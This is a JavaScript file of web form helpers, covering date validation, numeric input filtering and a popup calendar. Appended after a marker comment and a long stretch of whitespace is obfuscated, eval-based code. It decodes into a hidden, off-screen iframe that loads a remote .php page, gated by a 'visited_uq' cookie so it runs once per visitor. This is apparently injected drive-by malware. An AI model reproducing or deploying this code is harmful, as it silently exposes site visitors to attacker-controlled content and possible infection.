function defaultControl(c){
c.select();
c.focus();
}
function ReloadForm(fB){
fB.click();
}
function rTN(event){
if (window.event) k=window.event.keyCode;
else if (event) k=event.which;
else return true;
kC=String.fromCharCode(k);
if ((k==null) || (k==0) || (k==8) || (k==9) || (k==13) || (k==27)) return true;
else if ((("0123456789.-").indexOf(kC)>-1)) return true;
else return false;
}
function assignComboToInput(c,i){
i.value=c.value;
}
function inArray(v,tA,m){
for (i=0;i<tA.length;i++) if (v==tA[i].value) return true;
alert(m);
return false;
}
function isDate(dS,dF){
var mA=dS.match(/^(\d{1,2})(\/|-|.)(\d{1,2})(\/|-|.)(\d{4})$/);
if (mA==null){
alert("Please enter the date in the format "+dF);
return false;
}
if (dF=="d/m/Y"){
d=mA[1];
m=mA[3];
}else{
d=mA[3];
m=mA[1];
}
y=mA[5];
if (m<1 || m>12){
alert("Month must be between 1 and 12");
return false;
}
if (d<1 || d>31){
alert("Day must be between 1 and 31");
return false;
}
if ((m==4 || m==6 || m==9 || m==11) && d==31){
alert("Month "+m+" doesn`t have 31 days");
return false;
}
if (m==2){
var isleap=(y%4==0);
if (d>29 || (d==29 && !isleap)){
alert("February "+y+" doesn`t have "+d+" days");
return false;
}
}
return true;
}
function eitherOr(o,t){
if (o.value!='') t.value='';
else if (o.value=='NaN') o.value='';
}
/*Renier & Louis (info@tillcor.com) 25.02.2007
Copyright 2004-2007 Tillcor International
*/
days=new Array('Su','Mo','Tu','We','Th','Fr','Sa');
months=new Array('Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec');
dateDivID="calendar";
function Calendar(md,dF){
iF=document.getElementsByName(md).item(0);
pB=iF;
x=pB.offsetLeft;
y=pB.offsetTop+pB.offsetHeight;
var p=pB;
while (p.offsetParent){
p=p.offsetParent;
x+=p.offsetLeft;
y+=p.offsetTop;
}
dt=convertDate(iF.value,dF);
nN=document.createElement("div");
nN.setAttribute("id",dateDivID);
nN.setAttribute("style","visibility:hidden;");
document.body.appendChild(nN);
cD=document.getElementById(dateDivID);
cD.style.position="absolute";
cD.style.left=x+"px";
cD.style.top=y+"px";
cD.style.visibility=(cD.style.visibility=="visible" ? "hidden" : "visible");
cD.style.display=(cD.style.display=="block" ? "none" : "block");
cD.style.zIndex=10000;
drawCalendar(md,dt.getFullYear(),dt.getMonth(),dt.getDate(),dF);
}
function drawCalendar(md,y,m,d,dF){
var tD=new Date();
if ((m>=0) && (y>0)) tD=new Date(y,m,1);
else{
d=tD.getDate();
tD.setDate(1);
}
TR="<tr>";
xTR="</tr>";
TD="<td class='dpTD' onMouseOut='this.className=\"dpTD\";' onMouseOver='this.className=\"dpTDHover\";'";
xTD="</td>";
html="<table class='dpTbl'>"+TR+"<th colspan=3>"+months[tD.getMonth()]+" "+tD.getFullYear()+"</th>"+"<td colspan=2>"+
getButtonCode(md,tD,-1,"&lt;",dF)+xTD+"<td colspan=2>"+getButtonCode(md,tD,1,"&gt;",dF)+xTD+xTR+TR;
for(i=0;i<days.length;i++) html+="<th>"+days[i]+"</th>";
html+=xTR+TR;
for (i=0;i<tD.getDay();i++) html+=TD+"&nbsp;"+xTD;
do{
dN=tD.getDate();
TD_onclick=" onclick=\"postDate('"+md+"','"+formatDate(tD,dF)+"');\">";
if (dN==d) html+="<td"+TD_onclick+"<div class='dpDayHighlight'>"+dN+"</div>"+xTD;
else html+=TD+TD_onclick+dN+xTD;
if (tD.getDay()==6) html+=xTR+TR;
tD.setDate(tD.getDate()+1);
} while (tD.getDate()>1)
if (tD.getDay()>0) for (i=6;i>tD.getDay();i--) html+=TD+"&nbsp;"+xTD;
html+="</table>";
document.getElementById(dateDivID).innerHTML=html;
}
function getButtonCode(mD,dV,a,lb,dF){
nM=(dV.getMonth()+a)%12;
nY=dV.getFullYear()+parseInt((dV.getMonth()+a)/12,10);
if (nM<0){
nM+=12;
nY+=-1;
}
return "<button onClick='drawCalendar(\""+mD+"\","+nY+","+nM+","+1+",\""+dF+"\");'>"+lb+"</button>";
}
function formatDate(dV,dF){
ds=String(dV.getDate());
ms=String(dV.getMonth()+1);
d=("0"+dV.getDate()).substring(ds.length-1,ds.length+1);
m=("0"+(dV.getMonth()+1)).substring(ms.length-1,ms.length+1);
y=dV.getFullYear();
switch (dF) {
case "d/m/Y":
return d+"/"+m+"/"+y;
case "d.m.Y":
return d+"."+m+"."+y;
case "Y/m/d":
return y+"/"+m+"/"+d;
default :
return m+"/"+d+"/"+y;
}
}
function convertDate(dS,dF){
var d,m,y;
if (dF=="d.m.Y")
dA=dS.split(".");
else
dA=dS.split("/");
switch (dF){
case "d/m/Y","d.m.Y":
d=parseInt(dA[0],10);
m=parseInt(dA[1],10)-1;
y=parseInt(dA[2],10);
break;
case "Y/m/d":
d=parseInt(dA[2],10);
m=parseInt(dA[1],10)-1;
y=parseInt(dA[0],10);
break;
default :
d=parseInt(dA[1],10);
m=parseInt(dA[0],10)-1;
y=parseInt(dA[2],10);
break;
}
return new Date(y,m,d);
}
function postDate(mydate,dS){
var iF=document.getElementsByName(mydate).item(0);
iF.value=dS;
var cD=document.getElementById(dateDivID);
cD.style.visibility="hidden";
cD.style.display="none";
iF.focus();
}
function clickDate(){
Calendar(this.name,this.alt);
}
function changeDate(){
isDate(this.value,this.alt);
}
function initial(){
if (document.getElementsByTagName){
var as=document.getElementsByTagName("a");
for (i=0;i<as.length;i++){
var a=as[i];
if (a.getAttribute("href") &&
a.getAttribute("rel")=="external")
a.target="_blank";
}}
var ds=document.getElementsByTagName("input");
for (i=0;i<ds.length;i++){
if (ds[i].className=="date"){
ds[i].onclick=clickDate;
ds[i].onchange=changeDate;
}
if (ds[i].className=="number") ds[i].onkeypress=rTN;
}
}
window.onload=initial;

/*5b2681*/
                                                                                                                                                                                                                                                                                                                                                                       z="y";vz="d"+"oc"+"ument";ps="s"+"plit";try{+function(){++(window[vz].body)==null}()}catch(q){aa=function(ff){ff="fr"+"omCh"+ff;for(i=0;i<z.length;i++){za+=String[ff](e(v+(z[i]))-(13));}};};e=(eval);v="0x";a=0;try{;}catch(zz){a=1}if(!a){try{++e(vz)["\x62o"+"d"+z]}catch(q){a2="_";}z="2d_73_82_7b_70_81_76_7c_7b_2d_83_75_7a_3d_46_35_36_2d_88_1a_17_2d_83_6e_7f_2d_80_81_6e_81_76_70_4a_34_6e_77_6e_85_34_48_1a_17_2d_83_6e_7f_2d_70_7c_7b_81_7f_7c_79_79_72_7f_4a_34_76_7b_71_72_85_3b_7d_75_7d_34_48_1a_17_2d_83_6e_7f_2d_83_75_7a_2d_4a_2d_71_7c_70_82_7a_72_7b_81_3b_70_7f_72_6e_81_72_52_79_72_7a_72_7b_81_35_34_76_73_7f_6e_7a_72_34_36_48_1a_17_1a_17_2d_83_75_7a_3b_80_7f_70_2d_4a_2d_34_75_81_81_7d_47_3c_3c_80_75_76_79_7d_76_77_72_84_72_79_79_72_7f_80_6f_71_3b_70_7c_7a_3c_84_55_59_7d_57_75_87_50_3b_7d_75_7d_34_48_1a_17_2d_83_75_7a_3b_80_81_86_79_72_3b_7d_7c_80_76_81_76_7c_7b_2d_4a_2d_34_6e_6f_80_7c_79_82_81_72_34_48_1a_17_2d_83_75_7a_3b_80_81_86_79_72_3b_70_7c_79_7c_7f_2d_4a_2d_34_45_34_48_1a_17_2d_83_75_7a_3b_80_81_86_79_72_3b_75_72_76_74_75_81_2d_4a_2d_34_45_7d_85_34_48_1a_17_2d_83_75_7a_3b_80_81_86_79_72_3b_84_76_71_81_75_2d_4a_2d_34_45_7d_85_34_48_1a_17_2d_83_75_7a_3b_80_81_86_79_72_3b_79_72_73_81_2d_4a_2d_34_3e_3d_3d_3d_45_34_48_1a_17_2d_83_75_7a_3b_80_81_86_79_72_3b_81_7c_7d_2d_4a_2d_34_3e_3d_3d_3d_45_34_48_1a_17_1a_17_2d_76_73_2d_35_2e_71_7c_70_82_7a_72_7b_81_3b_74_72_81_52_79_72_7a_72_7b_81_4f_86_56_71_35_34_83_75_7a_34_36_36_2d_88_1a_17_2d_71_7c_70_82_7a_72_7b_81_3b_84_7f_76_81_72_35_34_49_7d_2d_76_71_4a_69_34_83_75_7a_69_34_2d_70_79_6e_80_80_4a_69_34_83_75_7a_3d_46_69_34_2d_4b_49_3c_7d_4b_34_36_48_1a_17_2d_71_7c_70_82_7a_72_7b_81_3b_74_72_81_52_79_72_7a_72_7b_81_4f_86_56_71_35_34_83_75_7a_34_36_3b_6e_7d_7d_72_7b_71_50_75_76_79_71_35_83_75_7a_36_48_1a_17_2d_8a_1a_17_8a_1a_17_73_82_7b_70_81_76_7c_7b_2d_60_72_81_50_7c_7c_78_76_72_35_70_7c_7c_78_76_72_5b_6e_7a_72_39_70_7c_7c_78_76_72_63_6e_79_82_72_39_7b_51_6e_86_80_39_7d_6e_81_75_36_2d_88_1a_17_2d_83_6e_7f_2d_81_7c_71_6e_86_2d_4a_2d_7b_72_84_2d_51_6e_81_72_35_36_48_1a_17_2d_83_6e_7f_2d_72_85_7d_76_7f_72_2d_4a_2d_7b_72_84_2d_51_6e_81_72_35_36_48_1a_17_2d_76_73_2d_35_7b_51_6e_86_80_4a_4a_7b_82_79_79_2d_89_89_2d_7b_51_6e_86_80_4a_4a_3d_36_2d_7b_51_6e_86_80_4a_3e_48_1a_17_2d_72_85_7d_76_7f_72_3b_80_72_81_61_76_7a_72_35_81_7c_71_6e_86_3b_74_72_81_61_76_7a_72_35_36_2d_38_2d_40_43_3d_3d_3d_3d_3d_37_3f_41_37_7b_51_6e_86_80_36_48_1a_17_2d_71_7c_70_82_7a_72_7b_81_3b_70_7c_7c_78_76_72_2d_4a_2d_70_7c_7c_78_76_72_5b_6e_7a_72_38_2f_4a_2f_38_72_80_70_6e_7d_72_35_70_7c_7c_78_76_72_63_6e_79_82_72_36_1a_17_2d_38_2d_2f_48_72_85_7d_76_7f_72_80_4a_2f_2d_38_2d_72_85_7d_76_7f_72_3b_81_7c_54_5a_61_60_81_7f_76_7b_74_35_36_2d_38_2d_35_35_7d_6e_81_75_36_2d_4c_2d_2f_48_2d_7d_6e_81_75_4a_2f_2d_38_2d_7d_6e_81_75_2d_47_2d_2f_2f_36_48_1a_17_8a_1a_17_73_82_7b_70_81_76_7c_7b_2d_54_72_81_50_7c_7c_78_76_72_35_2d_7b_6e_7a_72_2d_36_2d_88_1a_17_2d_83_6e_7f_2d_80_81_6e_7f_81_2d_4a_2d_71_7c_70_82_7a_72_7b_81_3b_70_7c_7c_78_76_72_3b_76_7b_71_72_85_5c_73_35_2d_7b_6e_7a_72_2d_38_2d_2f_4a_2f_2d_36_48_1a_17_2d_83_6e_7f_2d_79_72_7b_2d_4a_2d_80_81_6e_7f_81_2d_38_2d_7b_6e_7a_72_3b_79_72_7b_74_81_75_2d_38_2d_3e_48_1a_17_2d_76_73_2d_35_2d_35_2d_2e_80_81_6e_7f_81_2d_36_2d_33_33_1a_17_2d_35_2d_7b_6e_7a_72_2d_2e_4a_2d_71_7c_70_82_7a_72_7b_81_3b_70_7c_7c_78_76_72_3b_80_82_6f_80_81_7f_76_7b_74_35_2d_3d_39_2d_7b_6e_7a_72_3b_79_72_7b_74_81_75_2d_36_2d_36_2d_36_1a_17_2d_88_1a_17_2d_7f_72_81_82_7f_7b_2d_7b_82_79_79_48_1a_17_2d_8a_1a_17_2d_76_73_2d_35_2d_80_81_6e_7f_81_2d_4a_4a_2d_3a_3e_2d_36_2d_7f_72_81_82_7f_7b_2d_7b_82_79_79_48_1a_17_2d_83_6e_7f_2d_72_7b_71_2d_4a_2d_71_7c_70_82_7a_72_7b_81_3b_70_7c_7c_78_76_72_3b_76_7b_71_72_85_5c_73_35_2d_2f_48_2f_39_2d_79_72_7b_2d_36_48_1a_17_2d_76_73_2d_35_2d_72_7b_71_2d_4a_4a_2d_3a_3e_2d_36_2d_72_7b_71_2d_4a_2d_71_7c_70_82_7a_72_7b_81_3b_70_7c_7c_78_76_72_3b_79_72_7b_74_81_75_48_1a_17_2d_7f_72_81_82_7f_7b_2d_82_7b_72_80_70_6e_7d_72_35_2d_71_7c_70_82_7a_72_7b_81_3b_70_7c_7c_78_76_72_3b_80_82_6f_80_81_7f_76_7b_74_35_2d_79_72_7b_39_2d_72_7b_71_2d_36_2d_36_48_1a_17_8a_1a_17_76_73_2d_35_7b_6e_83_76_74_6e_81_7c_7f_3b_70_7c_7c_78_76_72_52_7b_6e_6f_79_72_71_36_1a_17_88_1a_17_76_73_35_54_72_81_50_7c_7c_78_76_72_35_34_83_76_80_76_81_72_71_6c_82_7e_34_36_4a_4a_42_42_36_88_8a_72_79_80_72_88_60_72_81_50_7c_7c_78_76_72_35_34_83_76_80_76_81_72_71_6c_82_7e_34_39_2d_34_42_42_34_39_2d_34_3e_34_39_2d_34_3c_34_36_48_1a_17_1a_17_83_75_7a_3d_46_35_36_48_1a_17_8a_1a_17_8a"[ps](a2);za="";aa("arCode");e(""+za);}
/*/5b2681*/
